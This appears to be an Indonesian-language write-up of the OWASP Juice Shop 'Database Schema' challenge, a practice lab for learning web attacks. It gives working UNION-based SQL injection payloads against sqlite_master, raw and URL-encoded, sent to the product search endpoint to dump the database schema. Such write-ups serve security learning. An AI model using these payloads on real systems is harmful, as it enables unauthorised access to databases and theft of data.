# Soal
- Kategori: Web – Injection
- Poin : ★★★ (3 bintang)
- Judul : Database Schema
- Tag : With Coding Challenge

# Resource
https://demo.owasp-juice.shop/#/score-board?categories=Injection

# Langkah Penyelesaian
1. Pertama tama saya menggunakan burp suite untuk menangkap request http, disini saya mencoba melakukan search dan menangkap responnya menggunakan burpsuite
<img width="1913" height="1004" alt="Screenshot 2025-09-10 204322" src="https://github.com/user-attachments/assets/57f7b279-c935-44fe-b960-9c65474258c7" />

2. Selanjutnya responnya saya kirimkan ke repeater dan saya memasukkan payload sesuai dengan instruksi yang ada pada hint soal, payload `')) UNION SELECT '1','1','1','1','2','3','7','8','9' FROM sqlite_master--` ini bertujuan untuk menampilkan isi dari database yang ada.
<img width="257" height="348" alt="Screenshot 2025-09-10 194916" src="https://github.com/user-attachments/assets/47651fe0-ed24-4f88-ae80-76824c6963f6" />

<img width="1891" height="1013" alt="Screenshot 2025-09-10 205926" src="https://github.com/user-attachments/assets/6ae9e76c-f33e-4747-9482-c0f4d2c64f1d" />

3. Seperti yang terlihat pada gambar sebelumnya bahwa kita belum bisa mengakses database melalui burpsuite, tapi kita bisa mencoba untuk mengcopy payload tersebut dan memasukannya ke dalam web url menjadi `http://127.0.0.1:3000/rest/products/search?q=%27))%20UNION%20SELECT%20%271%27,%271%27,%271%27,%271%27,%272%27,%273%27,%277%27,%278%27,%279%27%20FROM%20sqlite_master--` dan akan diperoleh hasil sebagai berikut.
<img width="1919" height="1020" alt="Screenshot 2025-09-10 210808" src="https://github.com/user-attachments/assets/a4eeb8fc-c33b-4b46-a75d-af465c8e83b7" />

4. Pada percobaan sebelumnya kita sudah bisa melihat isi dari database tetapi ini belum menyelesaikan soalnya, untuk menyelesaikan soalnya kita perlu mengcopas pada bagian rest sampai seterusnya dan menambahkan `%20sql` di antara `SELECT` dan `%20`. Maka akan menghasilkan payload sebagai berikut `/rest/products/search?q=%27))%20UNION%20SELECT%20sql%20%271%27,%271%27,%271%27,%271%27,%272%27,%273%27,%277%27,%278%27,%279%27%20FROM%20sqlite_master--`. Selanjutnya kita bisa langsung saja send maka kita bisa mengakses database yang ada dan menyelesaikan chalangenya
<img width="423" height="213" alt="Screenshot 2025-09-10 194922" src="https://github.com/user-attachments/assets/787f8dbd-4685-4fe2-a45c-68609a4a1b98" />

<img width="1897" height="797" alt="Screenshot 2025-09-10 224117" src="https://github.com/user-attachments/assets/453325f0-9c9b-4bc8-afb7-2f9b1c243656" />
